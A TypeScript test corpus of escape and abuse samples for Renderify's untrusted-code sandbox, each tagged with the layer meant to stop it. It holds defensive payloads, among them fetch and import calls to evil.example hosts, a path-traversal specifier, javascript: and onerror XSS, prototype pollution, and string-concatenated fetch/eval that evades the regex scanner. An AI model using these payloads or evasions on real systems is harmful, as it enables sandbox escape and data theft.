/**
 * Escape / abuse corpus for Renderify's untrusted-code execution path.
 *
 * This is the project's "poor-man's audit": a curated, regression-tested set of
 * attack samples that makes the *real* trust boundary explicit. Each sample
 * declares which layer actually stops it:
 *
 *   - "policy"  — the static security policy (@renderify/security) catches it.
 *                 These MUST stay caught; a regression here is a real hole.
 *   - "render"  — the UI renderer's attribute/URL/style sanitization catches it.
 *   - "sandbox" — static analysis does NOT catch it; the only hard boundary is
 *                 the execution sandbox (worker/iframe + global hardening).
 *   - "csp"     — static analysis does NOT catch it; the hard boundary is the
 *                 host/shell Content-Security-Policy (connect-src / script-src).
 *
 * The "sandbox"/"csp" samples are deliberately ones the regex-based source
 * scanner misses (e.g. `globalThis['fe'+'tch']`). Asserting that the policy
 * layer does NOT flag them is the honest part: it documents, in code, that the
 * banned-pattern list is a hint layer, not the boundary. See docs/threat-model.md.
 */

import {
  createElementNode,
  createTextNode,
  type RuntimeNode,
  type RuntimePlan,
} from "@renderify/ir";
import type { RuntimeSecurityProfile } from "@renderify/security";

export type EscapeBoundary = "policy" | "render" | "sandbox" | "csp";

export interface EscapeSample {
  id: string;
  title: string;
  /** The layer that actually stops this attack. */
  boundary: EscapeBoundary;
  profile: RuntimeSecurityProfile;
  /** Plan run through checkPlan (policy/sandbox/csp samples). */
  plan?: RuntimePlan;
  /** Specifier run through checkModuleSpecifier. */
  moduleSpecifier?: string;
  /** Node run through renderNode (render samples). */
  node?: RuntimeNode;
  expect: {
    /** Expected checkPlan().safe. */
    policySafe?: boolean;
    /** Expected checkModuleSpecifier().safe. */
    moduleSafe?: boolean;
    /** Substring that must be ABSENT from render output. */
    renderAbsent?: string;
    /** Substring that must be PRESENT in render output. */
    renderPresent?: string;
  };
  note: string;
}

function sourcePlan(id: string, code: string): RuntimePlan {
  return {
    specVersion: "runtime-plan/v1",
    id,
    version: 1,
    capabilities: { domWrite: true },
    root: createTextNode(""),
    source: { language: "js", runtime: "renderify", code },
  };
}

function deepTree(depth: number): RuntimeNode {
  let node: RuntimeNode = createTextNode("x");
  for (let i = 0; i < depth; i += 1) {
    node = createElementNode("div", undefined, [node]);
  }
  return node;
}

export const ESCAPE_CORPUS: EscapeSample[] = [
  // ---- policy layer: these MUST stay blocked ----
  {
    id: "tag-script",
    title: "script element in declarative tree",
    boundary: "policy",
    profile: "balanced",
    plan: {
      specVersion: "runtime-plan/v1",
      id: "tag-script",
      version: 1,
      root: createElementNode("script", undefined, [
        createTextNode("alert(1)"),
      ]),
    },
    expect: { policySafe: false },
    note: "blockedTags rejects script/iframe/object/embed/link/meta before execution.",
  },
  {
    id: "proto-pollution-path",
    title: "prototype pollution via state transition path",
    boundary: "policy",
    profile: "balanced",
    plan: {
      specVersion: "runtime-plan/v1",
      id: "proto-pollution-path",
      version: 1,
      root: createTextNode("x"),
      state: {
        initial: { ok: true },
        transitions: {
          click: [{ type: "set", path: "__proto__.polluted", value: true }],
        },
      },
    },
    expect: { policySafe: false },
    note: "isSafePath rejects __proto__/prototype/constructor segments.",
  },
  {
    id: "source-eval",
    title: "eval() in runtime source",
    boundary: "policy",
    profile: "balanced",
    plan: sourcePlan("source-eval", "eval('1+1'); export default () => null;"),
    expect: { policySafe: false },
    note: "Banned source pattern \\beval\\s*\\( is matched in strict/balanced/trusted.",
  },
  {
    id: "source-new-function",
    title: "new Function in runtime source",
    boundary: "policy",
    profile: "balanced",
    plan: sourcePlan(
      "source-new-function",
      "const f = new Function('return 1'); export default () => null;",
    ),
    expect: { policySafe: false },
    note: "Banned source pattern \\bnew\\s+Function\\b.",
  },
  {
    id: "source-fetch",
    title: "literal fetch() in runtime source",
    boundary: "policy",
    profile: "balanced",
    plan: sourcePlan(
      "source-fetch",
      "fetch('https://evil.example'); export default () => null;",
    ),
    expect: { policySafe: false },
    note: "Banned source pattern \\bfetch\\s*\\( catches the literal call form.",
  },
  {
    id: "source-dynamic-import",
    title: "dynamic import() in runtime source",
    boundary: "policy",
    profile: "balanced",
    plan: sourcePlan(
      "source-dynamic-import",
      "const m = import('https://evil.example/x.js'); export default () => null;",
    ),
    expect: { policySafe: false },
    note: "allowDynamicSourceImports is false outside relaxed; import() expressions are rejected.",
  },
  {
    id: "tree-depth-bomb",
    title: "excessively deep declarative tree (strict)",
    boundary: "policy",
    profile: "strict",
    plan: {
      specVersion: "runtime-plan/v1",
      id: "tree-depth-bomb",
      version: 1,
      root: deepTree(40),
    },
    expect: { policySafe: false },
    note: "maxTreeDepth bounds declarative recursion (strict = 8).",
  },
  {
    id: "source-localstorage-strict",
    title: "localStorage access in source (strict)",
    boundary: "policy",
    profile: "strict",
    plan: sourcePlan(
      "source-localstorage-strict",
      "localStorage.setItem('a','b'); export default () => null;",
    ),
    expect: { policySafe: false },
    note: "Strict bans localStorage/sessionStorage/indexedDB patterns.",
  },

  // ---- module specifier checks (policy layer) ----
  {
    id: "module-evil-host",
    title: "module from a non-allowlisted host",
    boundary: "policy",
    profile: "strict",
    moduleSpecifier: "https://evil.com/malware.js",
    expect: { moduleSafe: false },
    note: "Host not in allowedNetworkHosts is rejected.",
  },
  {
    id: "module-suffix-trick",
    title: "lookalike host suffix (ga.jspm.io.evil.com)",
    boundary: "policy",
    profile: "strict",
    moduleSpecifier: "https://ga.jspm.io.evil.com/x.js",
    expect: { moduleSafe: false },
    note: "Host matching is exact/anchored; a suffix-appended lookalike is rejected.",
  },
  {
    id: "module-node-builtin",
    title: "node: builtin specifier",
    boundary: "policy",
    profile: "strict",
    moduleSpecifier: "node:fs",
    expect: { moduleSafe: false },
    note: "Node builtins and unknown schemes are rejected deterministically.",
  },
  {
    id: "module-path-traversal",
    title: "path traversal specifier",
    boundary: "policy",
    profile: "strict",
    moduleSpecifier: "../../../../etc/passwd",
    expect: { moduleSafe: false },
    note: "Path traversal specifiers are rejected.",
  },

  // ---- render layer: sanitized at render time ----
  {
    id: "render-js-href",
    title: "javascript: URL in an anchor href",
    boundary: "render",
    profile: "balanced",
    node: createElementNode("a", { href: "javascript:alert(1)" }, [
      createTextNode("click"),
    ]),
    expect: { renderAbsent: "javascript:alert(1)" },
    note: "UI renderer rejects javascript:/data: URLs in href/src.",
  },
  {
    id: "render-style-expression",
    title: "CSS expression() in inline style",
    boundary: "render",
    profile: "balanced",
    node: createElementNode("div", { style: "width: expression(alert(1));" }, [
      createTextNode("x"),
    ]),
    expect: { renderAbsent: "expression(" },
    note: "Inline style values are screened for expression()/javascript:/url() etc.",
  },
  {
    id: "render-inline-handler",
    title: "inline on* event handler attribute",
    boundary: "render",
    profile: "balanced",
    node: createElementNode("img", { src: "x", onerror: "alert(1)" }, []),
    expect: { renderAbsent: "onerror" },
    note: "on* attributes are stripped and re-bound as runtime events.",
  },

  // ---- HONEST GAPS: static policy does NOT catch these ----
  // The only real boundary is the sandbox + CSP. Asserting policySafe:true here
  // is intentional — it documents the limit of static analysis in code.
  {
    id: "obfuscated-fetch",
    title: "string-concatenated fetch bypasses the banned-pattern regex",
    boundary: "csp",
    profile: "balanced",
    plan: sourcePlan(
      "obfuscated-fetch",
      "const g = globalThis; g['fe'+'tch']('https://evil.example'); export default () => null;",
    ),
    expect: { policySafe: true },
    note: "Regex \\bfetch\\s*\\( cannot see computed property access. Hard boundary: CSP connect-src + sandbox network removal.",
  },
  {
    id: "obfuscated-eval",
    title: "bracket-access eval bypasses the banned-pattern regex",
    boundary: "sandbox",
    profile: "balanced",
    plan: sourcePlan(
      "obfuscated-eval",
      "const w = globalThis; w['ev'+'al']('1+1'); export default () => null;",
    ),
    expect: { policySafe: true },
    note: "Computed eval evades the regex. Hard boundary: sandbox global hardening + CSP without 'unsafe-eval'.",
  },
];
